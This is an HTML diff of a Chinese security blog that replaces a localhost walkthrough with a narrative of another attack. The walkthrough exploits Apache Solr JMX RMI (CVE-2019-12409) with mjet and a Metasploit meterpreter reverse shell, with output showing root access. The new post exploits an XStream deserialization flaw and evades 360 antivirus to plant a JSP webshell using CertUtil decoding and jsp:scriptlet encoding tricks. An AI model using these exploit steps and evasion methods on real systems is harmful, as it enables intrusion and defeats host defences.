@@ -22,31 +22,20 @@
     var CONFIG = {"hostname":"x-f1v3.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="以 Apache Solr 远程代码执行(CVE-2019-12409)为例。">
-<meta name="keywords" content="反序列化">
+  <meta name="description" content="一次对反序列化漏洞的利用和主机防御绕过">
+<meta name="keywords" content="姿势,WAF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻击JMX RMI">
-<meta property="og:url" content="http://x-f1v3.github.io/blog/1575618238391.html">
+<meta property="og:title" content="一次对反序列化漏洞的利用和主机防御绕过">
+<meta property="og:url" content="http://x-f1v3.github.io/blog/untitled-1629284496877.html">
 <meta property="og:site_name" content="F1v3&#39;s Notes">
-<meta property="og:description" content="以 Apache Solr 远程代码执行(CVE-2019-12409)为例。">
+<meta property="og:description" content="一次对反序列化漏洞的利用和主机防御绕过">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575618795308.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575618883028.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575618943864.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575618983432.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575619076487.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575619146604.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575619247197.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575619340303.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575619589642.png">
-<meta property="og:image" content="http://x-f1v3.github.io/images/1575619715922.png">
-<meta property="og:updated_time" content="2020-11-05T08:08:09.750Z">
+<meta property="og:updated_time" content="2021-08-18T11:04:38.103Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻击JMX RMI">
-<meta name="twitter:description" content="以 Apache Solr 远程代码执行(CVE-2019-12409)为例。">
-<meta name="twitter:image" content="http://x-f1v3.github.io/images/1575618795308.png">
+<meta name="twitter:title" content="一次对反序列化漏洞的利用和主机防御绕过">
+<meta name="twitter:description" content="一次对反序列化漏洞的利用和主机防御绕过">
 
-<link rel="canonical" href="http://x-f1v3.github.io/blog/1575618238391.html">
+<link rel="canonical" href="http://x-f1v3.github.io/blog/untitled-1629284496877.html">
 
 
 <script id="page-configurations">
@@ -59,7 +48,7 @@
   };
 </script>
 
-  <title>攻击JMX RMI | F1v3's Notes</title>
+  <title>一次对反序列化漏洞的利用和主机防御绕过 | F1v3's Notes</title>
   
 
 
@@ -200,7 +189,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://x-f1v3.github.io/blog/1575618238391.html">
+    <link itemprop="mainEntityOfPage" href="http://x-f1v3.github.io/blog/untitled-1629284496877.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -213,7 +202,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          攻击JMX RMI
+          一次对反序列化漏洞的利用和主机防御绕过
         </h1>
 
         <div class="post-meta">
@@ -222,16 +211,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2019-12-06 15:43:58" itemprop="dateCreated datePublished" datetime="2019-12-06T15:43:58+08:00">2019-12-06</time>
+              <time title="Created: 2021-08-18 19:01:36 / Modified: 19:04:38" itemprop="dateCreated datePublished" datetime="2021-08-18T19:01:36+08:00">2021-08-18</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-11-05 16:08:09" itemprop="dateModified" datetime="2020-11-05T16:08:09+08:00">2020-11-05</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -274,27 +257,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>以 Apache Solr 远程代码执行(CVE-2019-12409)为例。<br><a id="more"></a></p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载 8.1.1 版本，结果发现在 solr.in.cmd 默认是 <code>false</code> ，只有在 solr.in.sh 默认才是 <code>true</code>，所以只有在 Linux 上才能触发。<br><img src="http://x-f1v3.github.io/images/1575618795308.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1575618883028.png" alt="image"></p>
-<p>在 bin 目录下运行 <code>./solr start</code> 启动 solr<br><img src="http://x-f1v3.github.io/images/1575618943864.png" alt="image"></p>
-<p>可以看到默认情况下 <code>18983</code> 是开启的<br><img src="http://x-f1v3.github.io/images/1575618983432.png" alt="image"></p>
-<h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>扫描端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sV -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://x-f1v3.github.io/images/1575619076487.png" alt="image"></p>
-<p>如果是未授权的话，可以直接连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jconsole  127.0.0.1:18983</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://x-f1v3.github.io/images/1575619146604.png" alt="image"></p>
-<p>比较奇怪的是，用 msf 检测漏洞是否存在的时候，没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/misc/java_rmi_server</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://x-f1v3.github.io/images/1575619247197.png" alt="image"></p>
-<p>用 nmap 脚本也没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=rmi-vuln-classloader -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://x-f1v3.github.io/images/1575619340303.png" alt="image"></p>
-<p>尴尬….</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="mjet"><a href="#mjet" class="headerlink" title="mjet"></a>mjet</h3><p>下载 <a href="https://github.com/x-f1v3/mjet" target="_blank" rel="noopener">mjet.py</a> 脚本。<br>因为开启的 jmx 服务默认是不需要验证的，所以直接利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 install passwd http://127.0.0.1:8000  8000</span><br><span class="line"></span><br><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command passwd &quot;whoami&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://x-f1v3.github.io/images/1575619589642.png" alt="image"></p>
-<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>利用 <code>exploit/multi/misc/java_jmx_server</code> 模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use java/meterpreter/reverse_tcp</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LHOST 127.0.0.1</span><br><span class="line">LHOST =&gt; 127.0.0.1</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; use exploit/multi/misc/java_jmx_server</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RHOST 127.0.0.1</span><br><span class="line">RHOST =&gt; 127.0.0.1</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983</span><br><span class="line">RPORT =&gt; 18983</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; run</span><br><span class="line"></span><br><span class="line">[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444 </span><br><span class="line">[*] 127.0.0.1:18983 - Using URL: http://0.0.0.0:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Local IP: http://172.16.65.171:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Sending RMI Header...</span><br><span class="line">[*] 127.0.0.1:18983 - Discovering the JMXRMI endpoint...</span><br><span class="line">[+] 127.0.0.1:18983 - JMXRMI endpoint on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Proceeding with handshake...</span><br><span class="line">[+] 127.0.0.1:18983 - Handshake with JMX MBean server on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Loading payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for mlet</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] 127.0.0.1:18983 - Executing payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] Sending stage (53837 bytes) to 127.0.0.1</span><br><span class="line">[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:40740) at 2019-12-06 14:20:04 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
-<p><img src="http://x-f1v3.github.io/images/1575619715922.png" alt="image"></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a href="https://www.optiv.com/blog/exploiting-jmx-rmi" target="_blank" rel="noopener">Exploiting JMX RMI</a></li>
-</ul>
+        <p>一次对反序列化漏洞的利用和主机防御绕过<br><a id="more"></a></p>
+<p>无图…</p>
+<p>在测试中发现一处 XStream 反序列化漏洞，使用 <code>ysoserial</code> 的 <code>CommonsBeanutils1</code> 的方式能成功远程代码执行，尝试使用系统命令写入 txt 文件成功：尝试写入 jsp 文件也成功，内容是 <code>test</code>。瞬间感觉稳了。</p>
+<p>立马准备写入蚁剑马，但是由于马有点长，又有特殊符号，直接用 <code>cmd.exe /c echo xx &gt; 1.jsp</code> 的方式肯定不科学，所以用 <code>CertUtil</code> 马命令解码的方式写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo dGVzdA== &gt;web/a.txt &amp; CertUtil -decode web/a.txt web/b.jsp</span><br></pre></td></tr></table></figure></p>
+<p>结果是 txt 文件存在， jsp 文件 404，这时觉得是马的问题，可能服务器上有啥防护，因为不能出网，所以也只能写文件了。之后用同样的 <code>CertUtil</code> 这种方式换了好几个免杀马都是404，这就很奇怪，难道现在的防护都怎么牛逼的吗？顿时觉得不太可能，也有可能是 <code>CertUtil</code> 这个命令的问题。</p>
+<p>于是把内容换成正常的，在解码成后缀是 txt 的，结果还是没有解码后的文件，这里可以确认是命令被拦截了。</p>
+<p>既然不能用 <code>CertUtil</code> 所以想着直接用代码写文件算了，因为是任意代码执行，所以用代码写文件应该是没问题的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String encodedText = &quot;PCUKb3V0LnByaW50KCJ0ZXN0Iik7CiU+&quot;;</span><br><span class="line">java.util.Base64.Decoder decoder = java.util.Base64.getDecoder();</span><br><span class="line">String  code_1 = new String(decoder.decode(encodedText), &quot;UTF-8&quot;);</span><br><span class="line">java.io.PrintWriter pu=new java.io.PrintWriter(new java.io.FileOutputStream(&quot;../1.jsp&quot;));</span><br><span class="line">pu.write(code_1);</span><br><span class="line">pu.close();</span><br></pre></td></tr></table></figure></p>
+<p>不过本地测试成功，线上一直没成功，也不清楚是啥原因，这条思路又断了。</p>
+<p>只能回到之前的 <code>cmd.exe /c echo xx &gt; 1.jsp</code> 这种成功的方式了，打算直接写入马，因为是直接使用 <code>ysoserial</code> 的 <code>CommonsBeanutils1</code>，所以在命令中加入双引号是个问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; + command.replaceAll(&quot;\\\\&quot;, &quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) + &quot;\&quot;);&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>省的麻烦，直接改造一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; + command + &quot;\&quot;);&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>直接用 <code>cmd.exe /c  echo \&quot;123\&quot; ../1.jsp</code> 即可写入；</p>
+<p>接下来写马，因为之前内容为 <code>test</code> 的 jsp 文件写入成功了，但是马写入失败，所以先写入一个测试的 jsp，内容为 <code>&lt;% out.print(&quot;test&quot;); %&gt;</code> ，失败。</p>
+<p>写入测试的 txt，内容为 <code>&lt;% out.print(&quot;test&quot;); %&gt;</code>，成功；<br>把写入的 txt 文件用 <code>move</code> 命令改成 jsp 后缀，失败；<br>写入测试的 jsp，内容为 <code>&lt;%  %&gt;</code>，失败；<br>写入测试的 jsp，内容为 <code>&lt;123</code>，成功；</p>
+<p>所以最后得出的结论是拦截内容中有 <code>&lt;%</code> 的后缀为 jsp 文件。这个可以用 <code>&lt;jsp:scriptlet&gt;</code> 替代。</p>
+<p>最终使用 <code>&lt;jsp:scriptlet&gt;</code> 加上部分 <code>unicode</code> 编码绕过，成功传马，看了下进程，发现防御软件是数字全家桶：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">映像名称                       PID 会话名              会话#       内存使用 </span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              0 Services                   0         24 K</span><br><span class="line">System                           4 Services                   0        372 K</span><br><span class="line">ZhuDongFangYu.exe              528 Services                   0     43,836 K</span><br><span class="line">360rp.exe                     5552                            1  1,115,180 K</span><br><span class="line">QQProtect.exe                 5024 Services                   0     22,220 K</span><br><span class="line">QQExternal.exe                8944                            1     20,244 K</span><br><span class="line">wdswfsafe.exe                 7056                            1     19,132 K</span><br><span class="line">360bdoctor.exe               23072                            1     16,264 K</span><br><span class="line">360tray.exe                  26164                            1    416,292 K</span><br><span class="line">360se.exe                    36916                            1     38,628 K</span><br><span class="line">360PatchMgr.exe              16528 Services                   0      9,728 K</span><br></pre></td></tr></table></figure></p>
 
     </div>
 
@@ -305,7 +282,8 @@
       <footer class="post-footer">
           
           <div class="post-tags">
-              <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+              <a href="/tags/姿势/" rel="tag"><i class="fa fa-tag"></i> 姿势</a>
+              <a href="/tags/WAF/" rel="tag"><i class="fa fa-tag"></i> WAF</a>
           </div>
 
         
@@ -314,13 +292,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/blog/1573541964775.html" rel="prev" title="hydra问题">
-      <i class="fa fa-chevron-left"></i> hydra问题
+    <a href="/blog/1627537078445.html" rel="prev" title="Weblogic反序列化漏洞分析（CVE-2021-2394）">
+      <i class="fa fa-chevron-left"></i> Weblogic反序列化漏洞分析（CVE-2021-2394）
     </a></div>
-      <div class="post-nav-item">
-    <a href="/blog/1577679142463.html" rel="next" title="CVE-2019-17571">
-      CVE-2019-17571 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -379,7 +354,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装"><span class="nav-number">1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#探测"><span class="nav-number">2.</span> <span class="nav-text">探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mjet"><span class="nav-number">3.1.</span> <span class="nav-text">mjet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf"><span class="nav-number">3.2.</span> <span class="nav-text">msf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
